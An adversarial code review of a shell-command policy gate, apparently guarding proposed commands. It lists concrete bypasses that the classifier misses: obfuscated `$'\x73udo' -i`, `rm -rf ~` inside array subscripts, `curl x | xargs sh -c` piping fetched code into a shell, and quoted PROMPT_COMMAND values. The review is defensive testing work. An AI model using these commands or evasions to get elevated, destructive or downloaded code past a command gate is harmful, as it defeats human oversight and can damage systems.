# Adversarial review — issue 197 (ast-policy-gate-command-engine)

All cases below were run through the public `nl_shell.gate.classify(cmd, origin="proposal")` on the patched tree at `$PDCA_TARGET`, using the pdca venv. Where a finding depends on bash behaviour, I confirmed that behaviour with this host's bash 5.3.9.

## Evidence: I tried to refute it and could not

- C4 red→green holds (`gate-logs/C4-verify.log:1167-1207`). 38 of 206 fail on the stub, and every non-floor group in `tests/test_gate_commands.py` is among the failures. Each failure is either an ImportError raised inside a test function at run time or an AssertionError. There are no collection errors, so this is not an UNVERIFIABLE red. The tests go through the production `classify`, not a copy of it.
- The changed expectations in `tests/test_policy_gate.py` only raise classes (for example `rm -rf />/dev/null` goes from mutating to destructive, and `cat <<E | sudo tee /x` becomes rejected). None are lowered.
- The budget test (`tests/test_gate_commands.py:686-694`) checks "alone fits, three together give could not class" through the public API, as the brief asks.
- I re-ran `scripts/harvest_inventory.py --output <sandbox>` on this host. It is byte-identical to the checked-in `targets/ubuntu-26.04/inventory.toml`.
- I tried about 300 bypasses inside the classes, and these all held: sudo option clustering (`-iS`, `-Si`), getopt long-option prefixes (`sudo --std`, `--prom=x`, `env --spl=`), `sudo -u -S` (`-S` as the user value, correctly not rejected), `/dev/fd/0`, `/proc/self/fd/0`, `bash -`, `compgen -C`, `bind -m vi -x`, `mapfile -tC`, `read -a 'a[$(…)]'`, `printf -v PS1`, `declare -n r=PS1`, sudo/pkexec/run0/doas wrapping a shell through env/nice/timeout/find/xargs, and `"$@"`/`$0`/`${@:1}` with literal positionals.

## Refutations: bypasses inside the brief's classes

- NEEDS-HUMAN [impl] — **Class 3, `[ -v` is not covered.** `src/nl_shell/gate/__init__.py:216-218`: `[ -v 'a[$(sudo -i)]' ]` as a proposal comes out `mutating`, not rejected, with the reason "no simple command to class". `[ -v 'a[$(rm -rf ~)]' ]` is also only `mutating`. The brief's class 3 names `test -v`/`[ -v` explicitly (brief.md:93). `test -v` is handled, but the `[ … ]` form is parsed as a test node with no Invocation, so the engine never sees it. Bash really runs the code: `a=(1); [ -v "a[\$(echo RAN1 >&2)]" ]` prints RAN1. The tests only cover `test -v`, so the property test missed this. Fix: send `[ … ]` through the `test` row, or treat a `[`-test whose operands hold `$`/backtick inside a subscript as decision B. This is the single-bracket builtin. `[[ … ]]` is out of scope and is a different case.
- NEEDS-HUMAN [impl] — **Class 6, a quoted compound value of `PROMPT_COMMAND` is read as a subshell, not as array elements.** `src/nl_shell/gate/rules.py:773-781` checks `value.source.startswith("(")`, but `source` still has its quotes. So `declare -a PROMPT_COMMAND='("sudo -i")'` falls through to `self.text(..., "bash")`. That parses `("sudo -i")` as a subshell running a single unknown word, and the result is `session-altering`, not rejected. Bash stores `PROMPT_COMMAND=([0]="sudo -i")` (checked with `declare -p`) and runs it at the next prompt. Brief class 6 says "PROMPT_COMMAND (scalar or array) … however the value is set: … export/declare" (brief.md:108-110). The unquoted form `PROMPT_COMMAND=('sudo -i')` is caught, which shows the gap is quote handling only.
- NEEDS-HUMAN [impl] — **Class 3, a quoted compound assignment to any array runs code and is not read.** Commands `declare`/`typeset`/`local`/`readonly` (row `targets/ubuntu-26.04/commands.toml:1270-1281`): `declare -a x='([$(sudo -i)]=1)'` and `declare -a x='($(sudo -i))'` as proposals are `session-altering` and not rejected. `declare -a x='([0]=$(rm -rf ~))'` is `session-altering`, below destructive. Bash runs the substitution in both the subscript and the value: RAN2, RAN3 and RAN4 all printed, including `local -a x='(…)'` inside a function. The subscript case falls under class 3's "every word bash evaluates … as a subscripted name". The unquoted `declare -a x=('$(sudo -i)')` is rejected, so only the quoted `-a`/`-A` value form gets through. Fix: when the row has `-a`/`-A` and the literal value is `(…)`, read it in bash grammar (subscripts in arithmetic), or apply decision B.
- NEEDS-HUMAN [impl] — **Class 4, run-time command words fed by words the gate cannot see.** `src/nl_shell/gate/rules.py:268-270` (`possible`) and `:286-287` (`word_a`) skip non-literal words. `-c` text whose command word is `"$@"`/`$0`/`$1` is therefore only `mutating` whenever the words that fill it are not literal:
  - `curl x | xargs sh -c '"$@"' _` is `mutating`. In effect it is `curl x | sh`, which is decision B.
  - `bash -c '$1' _ "$(curl x)"` is `mutating`.
  - `bash -c '"$@"' _ "$v"` is `mutating`.
  - `xargs sh -c '$0 -i' < f` is `mutating`.
  - `find . -exec sh -c '"$@"' _ {} \;` is `mutating`. The brief requires that "`find -exec` with a non-literal inner command [is] at least destructive", and the direct `find . -exec {} \;` path does give that (`rules.py:239`).

  Class 4 (brief.md:95-99) says every word that can reach command position goes through the command-word check, including "a non-literal inner command word". A non-literal command word in `-c` text, filled from non-literal or stdin-supplied positionals, should be decision B (at least destructive). The tests only use literal positionals (`_ sudo -i`), which is why they pass.
- NEEDS-HUMAN [impl] — **Decision A / class 4, ANSI-C quoted words are not decoded.** `src/nl_shell/gate/__init__.py:291-292` and `rules.py:286-287`:
  - `$'\x73udo' -i` as a proposal is `mutating` and not rejected.
  - `echo pw | $'\x73udo' -S true` is `mutating` and not rejected. That is the §5 pipe-into-sudo rule bypassed.
  - `foo $'\x73udo'` is `mutating`, but decision A says "after quote removal … names a row with elevates ⇒ privileged, rejected".
  - `$'\x72m' -rf ~` stays `mutating` (still pinned in `tests/test_policy_gate.py` "command word is not a literal").

  `$'…'` is quoting with a fixed value, not an expansion, and the engine already decodes it for options (`sudo $'-S' true` is rejected per the brief). Row 17 (`"r"m -rf ~`) gives the same answer to the same question for double quotes. The human may rule that this belongs to the #196 walker. In that case, retag it [human] and file a follow-up. As written, decision A's "after quote removal" is not met.

## Note (no failing case on this host)

- `targets/ubuntu-26.04/commands.toml:508-518`: the `x-terminal-emulator` row models `-e` as argv (`command = true`), and declares an option set different from the `ptyxis` row (`:520-534`), even though on this host `/usr/bin/x-terminal-emulator` resolves to `/usr/bin/ptyxis`. As a result, `x-terminal-emulator -e 'sudo -i'` is `mutating` with no reason beyond "not allowlisted". Ptyxis has no `-e`, so nothing runs here. On hosts where the alternative is gnome-terminal or xterm, a single `-e` string is split as a command line. Brief class 7 asks for this row "with its text effects". The rule that alias names share the row of the file they point to (class 1) is also not followed here. This is low risk on this target, so I have not tagged it.

## Verdict on the gates

The gating rows (C4, T3) are sound. The reviewer's claim I would not accept is that the property tests "check each rule over the whole table, so a new row or option cannot skip it" (brief.md:5-6). The five bypasses above are all inside classes 3, 4 and 6, and none is caught by a property test. The properties only plug literal test strings into declared row fields. They do not cover syntactic forms outside a row (`[ … ]`, quoted compound values, `$'…'`) or non-literal positionals.

<!-- pdca:leaf-complete -->
